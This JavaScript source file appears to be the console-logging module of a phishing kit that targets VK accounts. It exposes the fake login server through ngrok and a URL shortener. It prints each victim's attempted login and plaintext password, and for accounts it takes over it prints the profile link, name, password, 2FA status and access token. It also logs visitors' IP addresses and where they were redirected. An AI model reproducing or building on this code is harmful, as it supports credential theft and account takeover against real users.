const chalk = require('chalk')
const { consola } = require('../consola-fix')
const { R_SUCCESS, R_REQUIRE_2FA } = require('../auth-constants')
const declareExtension = require('./_')

module.exports = declareExtension(
  (instance) => {
    instance.on('ngrok:error', consola.error)

    instance.on('ngrok:ready-url', (url) => {
      consola.log('Listening public url: ' + url)
    })

    instance.on('aye-kosmonavt:got-short-url', (shortUrl) => {
      consola.log('Shorten url is: ' + shortUrl)
    })

    instance.on('start', ({ port, host }) => {
      consola.log(`🦄 Server listening on http://${host}:${port}/`)
    })

    instance.on('ws:started', (params) => {
      if (params.expose) {
        consola.info(
          `Socket.IO server listening on ws://localhost:${params.port}${params.path}`
        )
      } else {
        consola.log(
          `🔒 Socket.IO server listening on ws://${params.host}:${params.port}${params.path}`
        )
      }
    })

    instance.on('after:auth-attempt', ({ attempt, response }) => {
      consola.info({
        label: true,
        message: 'Trying authenticate with credentials'
      })

      const input = chalk.bold.blueBright('>')
      const outputSuccess = chalk.bold.green('< ')
      const outputFail = chalk.bold.red('< ')

      consola.log(`${input} Login: ${attempt.username}`)
      consola.log(`${input} Password: ${attempt.password}`)

      if (response.status === R_SUCCESS) {
        consola.log(outputSuccess + 'Success!')
      } else if (response.status === R_REQUIRE_2FA) {
        consola.log(outputFail + 'Required 2FA!')
      } else {
        consola.log(outputFail + 'Failed!')
      }
    })

    instance.on('after:successful-auth', (user) => {
      consola.info({
        message: `Got new account https://vk.com/id${user.id}`,
        badge: true
      })
      consola.info(`Name: ${user.first_name} ${user.last_name}`)
      consola.info(`Login: ${user.username}`)
      consola.info(`Password: ${user.password}`)
      if (user['2fa']) {
        consola.error('2fa: Enabled')
      } else {
        consola.success('2fa: Disabled')
      }
      consola.info(`Token: ${user.token}`)
    })

    instance.on('before:user-leave', ({ wayOut, ctx }) => {
      consola.success(`User with IP: ${ctx.req.connection.remoteAddress}
has been redirected to:
${wayOut}`)
    })

    return instance
  },
  {
    name: 'logger',
    description: 'Module that shows info in console'
  }
)
